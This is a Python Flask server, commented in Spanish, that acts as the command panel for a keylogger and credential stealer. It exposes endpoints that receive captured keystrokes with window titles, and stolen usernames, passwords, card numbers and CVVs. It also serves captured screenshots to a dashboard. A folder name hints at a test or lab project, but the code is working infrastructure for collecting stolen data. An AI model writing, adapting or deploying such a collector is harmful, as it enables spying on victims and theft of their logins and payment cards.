from flask import Flask, render_template, request, jsonify, send_from_directory
from datetime import datetime
import os

app = Flask(__name__)

teclas_capturadas = []
credenciales_capturadas = []

CARPETA_SCREENSHOTS = "C:\\Prueba_Final\\screenshots"

@app.route('/')
def index():
    return render_template('panel.html')

@app.route('/recibir_tecla', methods=['POST'])
def recibir_tecla():
    datos = request.get_json()
    teclas_capturadas.append({
        'timestamp': datetime.now().strftime('%H:%M:%S'),
        'ventana': datos.get('ventana', ''),
        'tecla': datos.get('tecla', '')
    })
    if len(teclas_capturadas) > 500:
        teclas_capturadas.pop(0)
    return jsonify({"status": "ok"})

@app.route('/recibir_credencial', methods=['POST'])
def recibir_credencial():
    datos = request.get_json()
    credenciales_capturadas.append({
        'timestamp': datetime.now().strftime('%H:%M:%S'),
        'tipo': datos.get('tipo', ''),
        'usuario': datos.get('usuario', ''),
        'password': datos.get('password', ''),
        'tarjeta': datos.get('tarjeta', ''),
        'cvv': datos.get('cvv', '')
    })
    return jsonify({"status": "ok"})

@app.route('/teclas')
def obtener_teclas():
    return jsonify(teclas_capturadas)

@app.route('/credenciales')
def obtener_credenciales():
    return jsonify(credenciales_capturadas)

@app.route('/ultima_captura')
def ultima_captura():
    try:
        archivos = [f for f in os.listdir(CARPETA_SCREENSHOTS) if f.endswith('.png')]
        if not archivos:
            return jsonify({"archivo": None})
        archivos.sort(reverse=True)
        return jsonify({"archivo": archivos[0]})
    except Exception:
        return jsonify({"archivo": None})

@app.route('/screenshots/<path:filename>')
def servir_screenshot(filename):
    return send_from_directory(CARPETA_SCREENSHOTS, filename)

if __name__ == '__main__':
    app.run(host='127.0.0.1', port=5000, debug=False)